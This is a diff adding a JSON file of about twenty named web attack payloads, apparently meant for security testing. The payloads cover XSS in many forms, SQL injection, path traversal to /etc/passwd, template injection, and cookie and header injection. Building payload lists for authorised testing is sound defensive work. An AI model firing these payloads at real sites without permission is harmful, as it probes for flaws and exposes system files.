@@ -1,0 +1,59 @@
+{
+  "ReflectedXSS": {
+    "payload": "<script>alert(1)</script>"
+  },
+  "StoredXSS": {
+    "payload": "<svg/onload=alert(1)>"
+  },
+  "JSONInjection": {
+    "payload": "{\"key\": \"<img src=x onerror=alert(1)>\"}"
+  },
+  "DOMBasedXSS": {
+    "payload": "javascript:alert(1)"
+  },
+  "AttributeInjection": {
+    "payload": "<img src=x onerror=alert('attr')>"
+  },
+  "EventHandlerXSS": {
+    "payload": "<body onload=alert('event')>"
+  },
+  "PolyglotXSS": {
+    "payload": "\"><svg/onload=alert('polyglot')>"
+  },
+  "SQLiTest": {
+    "payload": "' OR '1'='1"
+  },
+  "PathTraversal": {
+    "payload": "../../etc/passwd"
+  },
+  "TemplateInjection": {
+    "payload": "{{7*7}}"
+  },
+  "AngularJSXSS": {
+    "payload": "{{constructor.constructor('alert(1)')()}}"
+  },
+  "ReactJSXSS": {
+    "payload": "{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}}"
+  },
+  "VueJSXSS": {
+    "payload": "{{this.constructor.constructor('alert(1)')()}}"
+  },
+  "JSONPolyglot": {
+    "payload": "{\"key\": \"</script><script>alert('json')</script>\"}"
+  },
+  "CookiePoisoning": {
+    "payload": "sessionid=evil<script>alert('cookie')"
+  },
+  "HeaderInjection": {
+    "payload": "X-Forwarded-For: <script>alert('header')</script>"
+  },
+  "URLFragmentXSS": {
+    "payload": "#<img src=x onerror=alert('fragment')>"
+  },
+  "PostMessageXSS": {
+    "payload": "window.postMessage('<img src=x onerror=alert(1)>','*')"
+  },
+  "LocalStorageXSS": {
+    "payload": "localStorage.setItem('x','<img src=x onerror=alert(1)>')"
+  }
+}
